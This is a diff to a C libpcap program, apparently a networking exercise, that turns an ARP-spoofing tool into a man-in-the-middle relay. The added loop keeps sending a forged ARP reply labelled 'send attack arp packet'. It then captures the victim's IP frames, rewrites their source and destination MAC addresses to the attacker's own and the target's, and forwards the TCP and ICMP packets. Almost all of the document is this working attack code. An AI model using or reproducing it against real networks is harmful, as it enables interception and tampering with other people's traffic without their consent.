@@ -91,7 +91,7 @@ int main(int argc, char *argv[])
    char *dev;                       /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
    struct bpf_program fp;       	/* The compiled filter */
-   char filter_exp[] = "arp";       /* The filter expression */
+
    bpf_u_int32 mask;                /* Our netmask */
    bpf_u_int32 net;                 /* Our IP */
    struct pcap_pkthdr *header;  	/* The header that pcap gives us */
@@ -108,6 +108,14 @@ int main(int argc, char *argv[])
     struct arphdr *arp_to_know_mac;
     struct sniff_ethernet *ethernet;
 
+    struct sniff_ethernet *ethernet_relay;
+    struct sniff_ip *ip_relay;
+    struct sniff_tcp *tcp_relay;
+
+    unsigned int total_length;
+    u_char tcpoff;
+    u_char ipoff;
+    u_short datalength;
     u_char *sender_ip=argv[2];
     u_char *target_ip=argv[3];
     u_char sender_ip_data[4];
@@ -140,15 +148,6 @@ int main(int argc, char *argv[])
         handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
         if (handle == NULL) {
             fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
-            return(2);
-        }
-        /* Compile and apply the filter */
-        if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
-            fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
-            return(2);
-        }
-        if (pcap_setfilter(handle, &fp) == -1) {
-            fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
             return(2);
         }
 
@@ -242,9 +241,67 @@ int main(int argc, char *argv[])
             memcpy((*arpreply_arp).tha,sender_mac,6);
             inet_pton(AF_INET,sender_ip,(*arpreply_arp).tpa);    //targetip
 
+      while(1)
+      {
+	   printf("send attack arp packet\n");
+            if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
+            {
+                printf("error\n");
+            }
+
+            printf("sending relay packet\n");
+            int res;
+                   /* Grab a packet */
+            res=pcap_next_ex(handle, &header,&packet);
+            if(res==0) continue;
+            else if(res==-1) break;
+            else if(res==-2) break;
+
+	    ethernet_relay=(struct sniff_ethernet*)packet;
+
+	if(ntohs((*ethernet_relay).ether_type)==ETHERTYPE_IP)
+	{
+		if(!memcmp((*ethernet_relay).ether_shost,sender_mac,6))
+{
+		ip_relay=(struct sniff_ip*)(packet+14);
+		ipoff=(ip_relay->ip_vhl & 0x0F) * 4;
+
+	          memcpy((*ethernet_relay).ether_shost,my_mac,6);
+	  	  memcpy((*ethernet_relay).ether_dhost,target_mac,6);
+		if(ip_relay->ip_p==IPPROTO_TCP)
+		{
+		
+			tcp_relay=(struct sniff_tcp*)(packet+14+ipoff);
+
+			total_length=ntohs((*ip_relay).ip_len)+14;
+			
+           		if(pcap_sendpacket(handle,packet,total_length)!=0)
+          		{
+               			 printf("error\n");
+          		}
+		}
+		else if(ip_relay->ip_p==0x01)
+		{
+		
+			
+			total_length=ntohs((*ip_relay).ip_len)+14;
+			printf("total_length is %d \n",total_length);
+
+           		if(pcap_sendpacket(handle,packet,total_length)!=0)
+          		{
+               			 printf("error\n");
+          		}
+		}
+}
+
+	 }
+      }
+	
+
+
 	while(1)
 	{
-	   printf("send attack arp packet");
+	   printf("send attack arp packet\n");
             if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
             {
                 printf("error\n");
